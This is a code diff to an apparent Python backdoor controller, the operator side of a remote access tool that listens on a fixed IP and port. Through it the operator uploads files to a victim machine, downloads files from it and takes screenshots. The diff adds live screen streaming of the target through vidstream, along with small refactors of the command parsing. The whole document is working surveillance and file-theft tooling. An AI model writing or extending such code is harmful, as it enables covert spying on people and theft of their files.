@@ -8,7 +8,14 @@ import termcolor
 import json
 import help
 import os
+from vidstream import StreamingServer
+import threading
 
+# Connection data
+HOST = '192.168.1.110'
+PORT = 5555
+STREAM_PORT = 9999
+streamFlag = 0
 
 def send(data):
     jsonData = json.dumps(data)
@@ -69,9 +76,26 @@ def screenshotRecv(count):
     target.settimeout(None)
     f.close()
 
+# Start screensharing
+def streamServerStart():
+    server = StreamingServer(HOST, STREAM_PORT)
+
+    t = threading.Thread(target=server.start_server())
+    t.start()
+
+    cmd = input("[-] Type 'stream-stop' to end the stream:")
+
+    while cmd != 'stream-stop':
+        continue
+
+    send(cmd)
+    server.stop_server()
+
 # Sends and receives data to and from the backdoor
 def targetComs():
     count = 0
+    
+    global streamFlag
 
     while True:
 
@@ -84,18 +108,21 @@ def targetComs():
         elif prompt == 'clear': # Clear the screen
             os.system('clear')
         
-        elif prompt[:3] == 'cd ': # (Change directory implementation on the client-side)
+        elif prompt.startswith('cd '): # (Change directory implementation on the client-side)
             pass
 
-        elif prompt[:6] == 'upload': # Upload a file to  the target's file system
+        elif prompt.startswith('upload'): # Upload a file to  the target's file system
             uploadFile(prompt[7:])
 
-        elif prompt[:8] == 'download': # Download a file from the target's file system
+        elif prompt.startswith('download'): # Download a file from the target's file system
             downloadFile(prompt[9:])
 
-        elif prompt[:10]  == 'screenshot':
+        elif prompt.startswith('screenshot'):
             screenshotRecv(count)
             count += 1
+
+        elif prompt.startswith('stream-start'):
+            streamServerStart()
 
         elif prompt == 'help': # List all the available commands to the user
             print(termcolor.colored(help.HELP, 'green'))
@@ -104,9 +131,6 @@ def targetComs():
             response = recv()
             print(response)
 
-# Connection data
-HOST = '192.168.1.110'
-PORT = 5555
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind((HOST, PORT))
